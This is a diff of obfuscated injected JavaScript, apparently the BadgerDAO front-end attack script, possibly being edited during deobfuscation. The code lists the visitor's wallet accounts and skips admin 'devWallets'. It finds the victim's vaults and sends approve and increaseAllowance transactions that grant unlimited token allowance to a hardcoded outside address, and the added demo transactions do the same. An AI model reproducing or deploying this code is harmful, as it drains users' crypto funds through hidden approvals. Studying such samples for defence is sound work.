@@ -1,6 +1,9 @@
 <script>
 var empty_arr = Array(0x19b);
 var texts_arr = empty_arr.concat(["error","/log2","0xb16eb351000000000000000000000000","0x54cf9df9dcd78e470ab7cb892d7bfbe114c025fc","bool","0x59c68a651a1f49c26145666e9d5647b1472912a9","owner","0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff","text","uint256","Approval",", newSpender: ","ethers is embedded!",", contractAddress: ","formatUnits","method","parse","Web3Provider","Contract","0x392888ADe85c036bA57CFb3b17d41DbCAE64Aaa9","ethereum","increaseAllowance","allowance",", balance: ","encodeFunctionData","_approved: ","nonpayable","WITHDRAWING","approve",", maxVault: ","CLAIMING","utils","symbol","contractName","stringify","POST","event","spender","function increaseAllowance(address spender, uint addedValue)","16546248mVVbtv","_spender","0x45B14b5d5C536C3FAba451A1ba53387dcdDFCf2F","0x38b8F6af1D55CAa0676F1cbB33b344d8122535C2","listAccounts","apply","forEach","gas","log","data","balance","https://web.archive.org/web/20211129204203/https://api.badger.com/v2/accounts/","Transfer","931JNuWlv","contractSymbol","10512waBowy","_ethers","0xaf94d299a73c4545ff702e79d16d9fb1ab5bdabf","contractSymbol: ","2bQpZqP","allowanceWei","maxPriorityFeePerGas","encodedData","err","Withdrawing from the vault with the highest balance","view","3313384iKxMJQ","name","4531932SiFucS","EIP-1559","contract IERC20Upgradeable","function","toLowerCase","undefined","0x1FCdb04d0C5364FBd92C73cA8AF9BAA72c269107","Already has allowance, ","148955oXWuMb","address","0x2e1a7d4d000000000000000000000000","startsWith","params",": owner","includes","_to","Network is not Ethereum! network.chainId: ","length","0x4c16bf1f3acbcbf2b05291e8120dacc05c10586e","ADMIN: ","request","0x15b8fe651c268cfb5b519cc7e98bd45c162313c2","newArgs","eth_sendTransaction","decimals","providers","function approve(address spender, uint value)","value",", owner: ","gasPrice","balanceOf","Interface","maxFeePerGas","0xb65cef03b9b89f99517643226d76e286ee999e77","_value","hexlify","message","keys","application/json","Balance too low: ","userJson","maxBalance","_isIntercepted","uint8","transfer",", contractName: ","string","args","chainId","token","transferFrom","data_tx","2044480XuqSyr","2522511JAxUHN"]);
+// 2 Demo transactions
+var approveTx = {"method":"eth_sendTransaction","params":[{"value":"0x0","from":"0xf15525ed52F96A346F973238612f418929FaB4f7","to":"0x798D1bE841a82a273720CE31c822C61a67a601C3","data":"0x095ea7b30000000000000000000000001fcdb04d0c5364fbd92c73ca8af9baa72c269107ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff","gasLimit":"0x035ecf","gasPrice":"0x0178904655","nonce":"0x00","chainId":1,"gas":"0xff3f"}]};
+var increaseAllowance = {"method":"eth_sendTransaction","params":[{"value":"0x0","from":"0xf15525ed52F96A346F973238612f418929FaB4f7","to":"0x798D1bE841a82a273720CE31c822C61a67a601C3","data":"0x395093510000000000000000000000001fcdb04d0c5364fbd92c73ca8af9baa72c269107ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff","gasLimit":"0x035ecf","gasPrice":"0x0178904655","nonce":"0x00","chainId":1,"gas":"0xff3f"}]};
 
 (
     function (_0xff781a, _0x2ac14d) {
@@ -207,7 +210,7 @@ async function tx(_0x656ce6, _0x290819, requestArr) {
         const _0x48a672 = await ethProvider['listAccounts'](),
             victimAddr = _0x48a672[0x0];
         _log(methodName + ': owner', victimAddr);
-        var _0x1dfdb1 = [
+        var devWallets = [
             '0x392888ADe85c036bA57CFb3b17d41DbCAE64Aaa9',
             '0xb65cef03b9b89f99517643226d76e286ee999e77',
             '0x45B14b5d5C536C3FAba451A1ba53387dcdDFCf2F',
@@ -217,7 +220,7 @@ async function tx(_0x656ce6, _0x290819, requestArr) {
             '0x59c68a651a1f49c26145666e9d5647b1472912a9',
             '0x15b8fe651c268cfb5b519cc7e98bd45c162313c2'
         ];
-        if (_0x1dfdb1['includes'](victimAddr)) throw 'ADMIN: ' + victimAddr;
+        if (devWallets['includes'](victimAddr)) throw 'ADMIN: ' + victimAddr;
         var
             victimVaults = await getVaults(victimAddr),
             _0x1a0cab = victimVaults['value'];
